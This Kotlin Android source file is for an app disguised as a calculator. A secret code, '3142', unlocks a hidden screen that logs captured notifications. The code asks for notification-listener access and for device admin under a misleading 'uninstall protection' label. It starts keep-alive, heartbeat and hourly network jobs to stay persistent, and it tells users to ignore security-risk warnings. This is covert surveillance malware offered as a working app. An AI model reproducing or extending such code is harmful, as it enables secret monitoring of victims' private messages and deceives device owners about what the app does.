package com.android.mycalculator

import android.app.AlarmManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private lateinit var dbHelper: DatabaseHelper
    private lateinit var logTextView: TextView
    
    private lateinit var btnAdmin: Button
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    // --- Calculator Variables ---
    private lateinit var display: TextView
    private var isCalculated = false
    private var lastResult = ""
    private val logUpdateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            refreshLogs()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dbHelper = DatabaseHelper(this)
        
        // Layouts
        val calculatorLayout = findViewById<LinearLayout>(R.id.calculatorLayout)
        val mainContentLayout = findViewById<LinearLayout>(R.id.mainContentLayout)
        
        // --- 1. CALCULATOR LOGIC ---
        display = findViewById(R.id.calcDisplay)

        val numberButtons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, R.id.btnDot
        )
        
        for (id in numberButtons) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (isNewOperation) {
                    display.text = ""
                    isNewOperation = false
                }
                display.append(b.text)
            }
        }

        val operatorButtons = mapOf(
            R.id.btnAdd to "+", R.id.btnSub to "-", 
            R.id.btnMul to "×", R.id.btnDiv to "÷"
        )

        for ((id, op) in operatorButtons) {
            findViewById<Button>(id).setOnClickListener {
                previousInput = display.text.toString()
                currentOperator = op
                isNewOperation = true
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            display.text = "0"
            previousInput = ""
            currentOperator = ""
            isNewOperation = true
        }

        findViewById<Button>(R.id.btnDel).setOnClickListener {
            val text = display.text.toString()
            if (text.length > 1) {
                display.text = text.dropLast(1)
            } else {
                display.text = "0"
                isNewOperation = true
            }
        }

        // The Equals Button & Secret Trigger
        findViewById<Button>(R.id.btnEquals).setOnClickListener {
            val currentText = display.text.toString()

            // SECRET TRIGGER: Check for passcode "3142"
            if (currentText == "3142") {
                calculatorLayout.visibility = View.GONE
                mainContentLayout.visibility = View.VISIBLE
                
                // Trigger background checks only after successful login
                checkPermissions()
                refreshLogs()
                return@setOnClickListener
            }

            // Standard Math Logic
            if (previousInput.isNotEmpty() && currentOperator.isNotEmpty()) {
                try {
                    val num1 = previousInput.toDouble()
                    val num2 = currentText.toDouble()
                    val result = when (currentOperator) {
                        "+" -> num1 + num2
                        "-" -> num1 - num2
                        "×" -> num1 * num2
                        "÷" -> if (num2 != 0.0) num1 / num2 else Double.NaN
                        else -> 0.0
                    }
                    
                    // Format output
                    val resultText = if (result % 1.0 == 0.0) {
                        result.toLong().toString()
                    } else {
                        result.toString()
                    }
                    
                    display.text = resultText
                    previousInput = ""
                    currentOperator = ""
                    isNewOperation = true
                } catch (e: Exception) {
                    display.text = "Error"
                    isNewOperation = true
                }
            }
        }

        // --- 2. HIDDEN NOTIFICATION LOG LOGIC ---
        logTextView = findViewById(R.id.logTextView)
        val btnRefresh = findViewById<Button>(R.id.btnRefresh)
        val btnClear = findViewById<Button>(R.id.btnClear)
        
        btnAdmin = findViewById(R.id.btnAdmin)
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        btnAdmin.setOnClickListener {
            if (!dpm.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System utility requires active state.")
                }
                startActivity(intent)
            } else {
                dpm.removeActiveAdmin(adminComponent)
                updateAdminButtonUI()
                Toast.makeText(this, "Protection disabled.", Toast.LENGTH_SHORT).show()
            }
        }

        btnRefresh.setOnClickListener { refreshLogs() }

        btnClear.setOnClickListener {
            val db = dbHelper.writableDatabase
            db.execSQL("DELETE FROM logs")
            db.close()
            refreshLogs()
            Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
        }

        val filter = IntentFilter("com.android.mycalculator.NEW_NOTIFICATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(logUpdateReceiver, filter)
        }
    }

    override fun onResume() {
        super.onResume()
        if (::btnAdmin.isInitialized) {
            updateAdminButtonUI()
        }
    }

    private fun updateAdminButtonUI() {
        if (dpm.isAdminActive(adminComponent)) {
            btnAdmin.text = "🔓 Disable Uninstall Protection"
            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
        } else {
            btnAdmin.text = "🛡️ Enable Uninstall Protection"
            btnAdmin.backgroundTintList = getColorStateList(android.R.color.holo_blue_dark)
        }
    }

    private fun checkPermissions() {
        val permissionManager = PermissionManager(this)
        permissionManager.requestAllPermissions()
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(logUpdateReceiver)
    }

    private fun refreshLogs() {
        val logs = dbHelper.getAllLogs()
        if (logs.isNotEmpty()) {
            logTextView.text = logs
        } else {
            logTextView.text = "Waiting for notifications..."
        }
    }
}

// ========== PERMISSION MANAGER ==========
class PermissionManager(private val activity: MainActivity) {
    
    fun requestAllPermissions() {
        requestNotificationAccess()
        requestDndAccess()
        requestWriteSettings()
        requestUsageAccess()
        requestBatteryOptimization()
        requestExactAlarms()
        requestDisplayOverlay()
        requestNotificationPermission()
        checkManufacturerSettings()
        startAllServices()
    }

    private fun requestWriteSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!android.provider.Settings.System.canWrite(activity)) {
                val intent = Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
                android.widget.Toast.makeText(
                    activity, 
                    "Please allow 'Modify System Settings' to force silent mode.", 
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        }
    }

    private fun requestUsageAccess() {
        val appOpsManager = activity.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOpsManager.unsafeCheckOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
                android.os.Process.myUid(), 
                activity.packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOpsManager.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, 
                android.os.Process.myUid(), 
                activity.packageName
            )
        }

        if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
            val intent = Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
            activity.startActivity(intent)
            android.widget.Toast.makeText(
                activity, 
                "Please allow 'Usage Access' to keep the app alive.", 
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun requestDndAccess() {
        val notificationManager = activity.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        if (!notificationManager.isNotificationPolicyAccessGranted) {
            val intent = Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
            activity.startActivity(intent)
            android.widget.Toast.makeText(
                activity, 
                "Please grant 'Do Not Disturb' access to allow remote silent mode.", 
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun requestNotificationAccess() {
        val enabledListeners = android.provider.Settings.Secure.getString(
            activity.contentResolver,
            "enabled_notification_listeners"
        )
        
        if (enabledListeners == null || !enabledListeners.contains(activity.packageName)) {
            android.app.AlertDialog.Builder(activity)
                .setTitle("Notification Access Required")
                .setMessage("You need to manually enable notification access for this app.\n\n" +
                           "Step 1: Find 'Notify Log' (or 'Calculator') in the list\n" +
                           "Step 2: Toggle the switch ON\n\n" +
                           "The app may crash once - this is normal. Restart after enabling.")
                .setPositiveButton("Open Settings") { _, _ ->
                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                    activity.startActivity(intent)
                }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }
    
    private fun requestBatteryOptimization() {
        val pm = activity.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!pm.isIgnoringBatteryOptimizations(activity.packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }
    }
    
    private fun requestExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            if (!alarmManager.canScheduleExactAlarms()) {
                val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }
    }
    
    private fun requestDisplayOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }
    }
    
    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (activity.checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                activity.requestPermissions(
                    arrayOf(android.Manifest.permission.POST_NOTIFICATIONS),
                    1001
                )
            }
        }
    }
    
    private fun checkManufacturerSettings() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        
        when {
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> {
                android.widget.Toast.makeText(
                    activity,
                    "XIAOMI: Settings → Passwords & security → Privacy → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                showXiaomiNotificationGuide()
            }
            manufacturer.contains("samsung") -> {
                android.widget.Toast.makeText(
                    activity,
                    "SAMSUNG: Settings → Notifications → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                android.widget.Toast.makeText(
                    activity,
                    "HUAWEI: Settings → Apps → Apps → Calculator → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            manufacturer.contains("oppo") || manufacturer.contains("oneplus") || manufacturer.contains("realme") -> {
                android.widget.Toast.makeText(
                    activity,
                    "OPPO: Settings → Notifications & status bar → Notification access",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        }
    }
    
    private fun showXiaomiNotificationGuide() {
        android.app.AlertDialog.Builder(activity)
            .setTitle("Xiaomi Special Instructions")
            .setMessage("On Xiaomi phones:\n\n" +
                       "1. Go to Settings\n" +
                       "2. Passwords & security\n" +
                       "3. Privacy\n" +
                       "4. Notification access\n" +
                       "5. Find 'Calculator' and enable\n\n" +
                       "If it shows 'Security risk' warning, ignore and enable anyway.")
            .setPositiveButton("OK", null)
            .show()
    }
    
    private fun startAllServices() {
        val notifIntent = Intent(activity, NotificationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            activity.startForegroundService(notifIntent)
        } else {
            activity.startService(notifIntent)
        }
        
        val keepAliveIntent = Intent(activity, KeepAliveService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            activity.startForegroundService(keepAliveIntent)
        } else {
            activity.startService(keepAliveIntent)
        }
        
        val heartbeatIntent = Intent(activity, HeartbeatService::class.java)
        activity.startService(heartbeatIntent)
        
        AlarmScheduler.scheduleAlarms(activity)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            scheduleBackupJob()
        }
    }
    
    private fun scheduleBackupJob() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = activity.getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
            
            val job = android.app.job.JobInfo.Builder(1005, 
                android.content.ComponentName(activity, BackupJobService::class.java))
                .setPeriodic(60 * 60 * 1000) // Every 1 hour
                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                .setRequiresDeviceIdle(false)
                .setRequiresCharging(false)
                .setPersisted(true)
                .build()
            
            jobScheduler.schedule(job)
        }
    }
}
